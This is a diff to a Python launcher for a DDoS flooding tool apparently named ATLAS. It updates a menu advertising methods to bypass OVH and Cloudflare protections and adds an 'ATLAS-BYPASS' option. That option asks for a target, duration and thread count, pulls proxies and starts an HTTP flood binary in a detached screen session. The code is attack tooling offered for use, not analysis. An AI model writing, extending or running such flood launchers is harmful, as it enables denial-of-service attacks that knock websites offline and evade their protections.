@@ -166,7 +166,7 @@ def methodbanner():
 ╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
 ║   \033[1;36;40mATLAS-NULL    \033[1;31;40m║ \033[1;36;40mBYPASS OVH-DIGI SITES \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
 ╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
-║   \033[1;36;40mATLAS-UAM     \033[1;31;40m║ \033[1;36;40mBYPASS CLOUDFLARE UAM \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║     \033[1;31;47mUNAVAILABLE\033[1;31;40m     ║
+║   \033[1;36;40mATLAS-BYPASS  \033[1;31;40m║ \033[1;36;40mHTTP/1.3 + GET + POST \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
 ╚═════════════════╩═══════════════════════╩══════════════════════╩═════════════════════╝
     """)
   
@@ -211,9 +211,15 @@ def launchflood():
 				run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} null-x {thread}'], shell=True)
 			except:
 				print("Error try again")
-		elif methods in ["ATLAS-UAM", "atlas-uam"]:
-			unavail()
-			repeater()
+		elif methods in ["ATLAS-BYPASS", "atlas-bypass"]:
+			try:
+				target = input("[X] Target: ")
+				floodtime = int(input("[X] Time: "))
+				thread = int(input("[X] Threads [1-5]: "))
+				getproxy()
+				run([f'screen -dm ./methods/ATLAS-BYPASS {target} {floodtime} 64 {thread}'], shell=True)
+			except:
+				print("Error try again")
 		elif methods in "":
 			pass
 		elif methods in ["clear", "CLEAR", "cls", "CLS"]:
@@ -223,12 +229,6 @@ def launchflood():
 			print("[+] Attack Stopped!")
 		else:
 		   print("[X] Invalid Method")
-    #if (methods == "ATLAS-UAM") or (methods == "atlas-uam"):
-    #    target = input("[X] Target: ")
-    #    time = input("[X] Time: ")
-    #    thread = input("[X] Threads [5-10]: ")
-    #    run([f'./methods/ATLAS-METHODS {target} {time} uam {thread}'], shell=True)
-
 
 #FileUpdates
 def fileupdate():
